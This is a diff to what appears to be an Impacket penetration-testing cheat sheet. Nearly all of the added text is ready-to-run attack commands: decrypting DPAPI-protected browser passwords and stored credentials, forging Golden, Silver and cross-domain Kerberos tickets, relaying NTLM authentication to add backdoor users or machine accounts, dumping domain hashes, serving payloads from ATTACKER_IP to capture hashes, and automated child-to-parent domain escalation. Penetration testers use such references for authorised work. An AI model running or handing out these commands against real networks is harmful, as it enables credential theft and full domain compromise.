@@ -455,3 +455,312 @@ SELECT * FROM OPENQUERY([$LINKED_SERVER], 'SELECT @@version');
 SELECT * FROM OPENQUERY([$LINKED_SERVER], 'SELECT IS_SRVROLEMEMBER(''sysadmin'')');
 EXEC ('xp_cmdshell ''whoami''') AT [$LINKED_SERVER];
 ```
+
+## DPAPI (dpapi.py)
+
+Decrypt Windows DPAPI-protected secrets: browser saved passwords, credential manager, Wi-Fi keys, and anything else encrypted with a masterkey. The masterkey is encrypted with the user's password (or the domain backup key for domain accounts).
+
+### Masterkeys
+
+```bash wrap
+# Decrypt masterkey with the user's plaintext password
+dpapi.py masterkey \
+  -file "/Users/$USER/AppData/Roaming/Microsoft/Protect/$SID/$GUID" \
+  -sid $SID \
+  -password $PASSWORD
+
+# Decrypt masterkey using the domain backup key (pvk file from secretsdump)
+dpapi.py masterkey \
+  -file "/Users/$USER/AppData/Roaming/Microsoft/Protect/$SID/$GUID" \
+  -pvk domain_backup.pvk
+
+# Decrypt all masterkeys for a user (point to the Protect folder)
+dpapi.py masterkey \
+  -directory "/Users/$USER/AppData/Roaming/Microsoft/Protect/$SID/" \
+  -pvk domain_backup.pvk
+```
+
+### Credential Files
+
+```bash wrap
+# List Windows Credential Manager files
+dpapi.py credential -file "/Users/$USER/AppData/Local/Microsoft/Credentials/$GUID" \
+  -key $MASTERKEY_HEX
+
+# Batch decrypt all credential files using decrypted masterkey
+dpapi.py credential \
+  -directory "/Users/$USER/AppData/Local/Microsoft/Credentials/" \
+  -key $MASTERKEY_HEX
+```
+
+### Chrome / Browser Saved Passwords
+
+```bash wrap
+# Decrypt Chrome Login Data (requires Local State + Login Data files)
+dpapi.py chrome \
+  --logindata "/Users/$USER/AppData/Local/Google/Chrome/User Data/Default/Login Data" \
+  --key "/Users/$USER/AppData/Local/Google/Chrome/User Data/Local State"
+
+# With masterkey (if Local State key is encrypted with DPAPI)
+dpapi.py chrome \
+  --logindata "Login Data" \
+  --key "Local State" \
+  -masterkey $MASTERKEY_HEX
+```
+
+### Generic Blob Decryption
+
+```bash wrap
+# Decrypt a raw DPAPI blob
+dpapi.py blob -blob blob.bin -masterkey $MASTERKEY_HEX
+
+# From base64-encoded blob
+dpapi.py blob -blob blob.b64 -masterkey $MASTERKEY_HEX
+```
+
+### Vault Files
+
+```bash wrap
+# Decrypt Windows Vault entries (e.g., RDP saved credentials)
+dpapi.py vault \
+  -vcrd "/Users/$USER/AppData/Local/Microsoft/Vault/$GUID/..." \
+  -masterkey $MASTERKEY_HEX
+```
+
+## Ticket Forging (ticketer.py)
+
+Forge Kerberos tickets offline. Requires hashes extracted via secretsdump.
+
+### Golden Ticket
+
+Requires the `krbtgt` NT hash and domain SID. Valid for any user, any service, any host.
+
+```bash wrap
+# Forge a Golden Ticket as Administrator
+ticketer.py \
+  -nthash $KRBTGT_HASH \
+  -domain-sid $DOMAIN_SID \
+  -domain $DOMAIN \
+  Administrator
+
+export KRB5CCNAME=Administrator.ccache
+secretsdump.py -k -no-pass $DOMAIN/Administrator@$DC_HOST
+psexec.py -k -no-pass $DOMAIN/Administrator@$DC_HOST
+```
+
+### Silver Ticket
+
+Requires the target service account's NT hash. Valid for a single service on a single host — no contact with the DC needed.
+
+```bash wrap
+# Forge a Silver Ticket for CIFS (file sharing) on a target host
+ticketer.py \
+  -nthash $SERVICE_HASH \
+  -domain-sid $DOMAIN_SID \
+  -domain $DOMAIN \
+  -spn cifs/$TARGET.$DOMAIN \
+  -user-id 500 \
+  Administrator
+
+export KRB5CCNAME=Administrator.ccache
+smbclient.py -k -no-pass $DOMAIN/Administrator@$TARGET.$DOMAIN
+```
+
+### ExtraSids (Child to Parent Domain)
+
+```bash wrap
+# Forge a cross-domain ticket with Enterprise Admins SID injected
+ticketer.py \
+  -nthash $CHILD_KRBTGT_HASH \
+  -domain-sid $CHILD_DOMAIN_SID \
+  -domain child.$DOMAIN \
+  -extra-sid $PARENT_DOMAIN_SID-519 \
+  Administrator
+
+export KRB5CCNAME=Administrator.ccache
+psexec.py -k -no-pass $DOMAIN/Administrator@parent-dc.$DOMAIN
+secretsdump.py -k -no-pass $DOMAIN/Administrator@parent-dc.$DOMAIN
+```
+
+## Ticket Inspection (describeTicket.py)
+
+Inspect ccache and kirbi files to check validity, SIDs, session key, and expiry.
+
+```bash wrap
+# Inspect a ccache file
+describeTicket.py ticket.ccache
+
+# Inspect a kirbi file
+describeTicket.py ticket.kirbi
+
+# Extract session key (needed for SPN-less RBCD trick)
+describeTicket.py $USER.ccache | grep 'Ticket Session Key'
+```
+
+## NTLM Relay (ntlmrelayx.py)
+
+Relay incoming NTLM authentication to other services. Requires capturing NTLM auth via Responder, printerbug, PetitPotam, or similar coercion.
+
+```bash wrap
+# Generate relay target list (hosts with SMB signing disabled)
+nxc smb $SUBNET --gen-relay-list relay_targets.txt
+```
+
+### Relay to SMB
+
+```bash wrap
+# Relay to SMB on all targets — dumps SAM if admin
+ntlmrelayx.py -tf relay_targets.txt -smb2support
+
+# Execute a command on relay
+ntlmrelayx.py -tf relay_targets.txt -smb2support -c "net user hacker Pass123! /add"
+
+# Interactive SOCKS relay sessions (use socks proxy to interact after capture)
+ntlmrelayx.py -tf relay_targets.txt -smb2support -socks
+# then in another terminal: socks4 127.0.0.1 1080 via proxychains
+```
+
+### Relay to LDAP
+
+```bash wrap
+# Relay to LDAP — dumps credentials and AD info
+ntlmrelayx.py -t ldap://$DC_HOST -smb2support
+
+# Relay to LDAP for RBCD (grants controlled machine delegation on victim)
+ntlmrelayx.py -t ldap://$DC_HOST --delegate-access --escalate-user '$COMP_NAME$' -smb2support
+
+# Relay to LDAP and add user to Domain Admins
+ntlmrelayx.py -t ldap://$DC_HOST -smb2support \
+  --add-computer evilpc EvilPass123! \
+  --delegate-access
+```
+
+### Relay to MSSQL
+
+```bash wrap
+ntlmrelayx.py -t mssql://$TARGET -smb2support -q "SELECT @@version"
+ntlmrelayx.py -t mssql://$TARGET -smb2support --mssql-auth-type windows
+```
+
+### Relay to HTTP / ADCS (ESC8)
+
+```bash wrap
+# Relay to AD CS web enrollment to get a certificate for the victim account
+ntlmrelayx.py -t http://$CA_HOST/certsrv/certfnsh.asp -smb2support --adcs --template Machine
+```
+
+## Password Change (changepasswd.py)
+
+Change or force-reset passwords. Supports SAMR and Kerberos set-password protocols.
+
+<Tabs>
+  <Tab title="Password">
+    ```bash wrap
+    # Change own password (knows current)
+    changepasswd.py $DOMAIN/$USER:$OLD_PASSWORD@$DC_IP -newpass $NEW_PASSWORD
+
+    # Force change another user's password (requires ForceChangePassword ACE)
+    changepasswd.py $DOMAIN/$USER:$PASSWORD@$DC_IP -altuser $TARGET -newpass $NEW_PASSWORD
+    ```
+  </Tab>
+  <Tab title="NT Hash">
+    ```bash wrap
+    changepasswd.py $DOMAIN/$USER@$DC_IP -hashes :$NTHASH -newpass $NEW_PASSWORD
+    changepasswd.py $DOMAIN/$USER@$DC_IP -hashes :$NTHASH -altuser $TARGET -newpass $NEW_PASSWORD
+
+    # Overwrite NT hash directly (SPN-less RBCD trick: replace hash with TGT session key)
+    changepasswd.py $DOMAIN/$USER@$DC_HOST -newhashes :$TGT_SESSION_KEY -hashes :$NTHASH
+    ```
+  </Tab>
+  <Tab title="Kerberos">
+    ```bash wrap
+    export KRB5CCNAME=/tmp/ticket.ccache
+    changepasswd.py -k -no-pass $DOMAIN/$USER@$DC_HOST -altuser $TARGET -newpass $NEW_PASSWORD
+    ```
+  </Tab>
+</Tabs>
+
+## AD User Enumeration (GetADUsers.py)
+
+Quick user enumeration via LDAP — returns all users or a specific account with attributes.
+
+<Tabs>
+  <Tab title="Password">
+    ```bash wrap
+    # List all domain users
+    GetADUsers.py $DOMAIN/$USER:$PASSWORD -dc-ip $DC_IP -all
+
+    # Query a specific user
+    GetADUsers.py $DOMAIN/$USER:$PASSWORD -dc-ip $DC_IP -user $TARGET
+    ```
+  </Tab>
+  <Tab title="NT Hash">
+    ```bash wrap
+    GetADUsers.py $DOMAIN/$USER -hashes :$NTHASH -dc-ip $DC_IP -all
+    GetADUsers.py $DOMAIN/$USER -hashes :$NTHASH -dc-ip $DC_IP -user $TARGET
+    ```
+  </Tab>
+  <Tab title="Kerberos">
+    ```bash wrap
+    export KRB5CCNAME=/tmp/ticket.ccache
+    GetADUsers.py $DOMAIN/$USER -k -no-pass -dc-ip $DC_IP -all
+    ```
+  </Tab>
+</Tabs>
+
+## SMB File Server (smbserver.py)
+
+Serve a local directory over SMB. Useful for file transfer, hosting payloads, or forcing NTLM authentication from a target that reads from a UNC path.
+
+```bash wrap
+# Anonymous share (no auth required)
+smbserver.py -smb2support SHARE /path/to/serve
+
+# Authenticated share
+smbserver.py -smb2support -username $USER -password $PASSWORD SHARE /path/to/serve
+
+# Capture NTLM hashes from incoming connections (pair with Responder for relay)
+smbserver.py -smb2support SHARE /tmp/share
+
+# Then on the target: \\ATTACKER_IP\SHARE\payload.exe (forces NTLM auth back to you)
+```
+
+## WMI Queries (wmiquery.py)
+
+Execute arbitrary WMI queries on a remote host.
+
+<Tabs>
+  <Tab title="Password">
+    ```bash wrap
+    wmiquery.py $DOMAIN/$USER:$PASSWORD@$IP "SELECT * FROM Win32_UserAccount"
+    wmiquery.py $DOMAIN/$USER:$PASSWORD@$IP "SELECT * FROM Win32_Process"
+    wmiquery.py $DOMAIN/$USER:$PASSWORD@$IP "SELECT * FROM Win32_Service WHERE StartMode='Auto'"
+    ```
+  </Tab>
+  <Tab title="NT Hash">
+    ```bash wrap
+    wmiquery.py $DOMAIN/$USER@$IP -hashes :$NTHASH "SELECT * FROM Win32_UserAccount"
+    ```
+  </Tab>
+  <Tab title="Kerberos">
+    ```bash wrap
+    export KRB5CCNAME=/tmp/ticket.ccache
+    wmiquery.py -k -no-pass $DOMAIN/$USER@$HOSTNAME "SELECT * FROM Win32_UserAccount"
+    ```
+  </Tab>
+</Tabs>
+
+## Child to Parent Escalation (raiseChild.py)
+
+Automates the ExtraSids attack: DCSync from a compromised child domain, forge a Golden Ticket with the Enterprise Admins SID, and get a shell on the parent DC. Requires child domain DC admin.
+
+```bash wrap
+# Full automated chain: child DC creds to parent DA
+raiseChild.py child.$DOMAIN/$USER:$PASSWORD
+
+# Execute a command on the parent DC after escalation
+raiseChild.py child.$DOMAIN/$USER:$PASSWORD -target-exec parent-dc.$DOMAIN
+
+# With NT hash
+raiseChild.py child.$DOMAIN/$USER -hashes :$NTHASH -target-exec parent-dc.$DOMAIN
+```
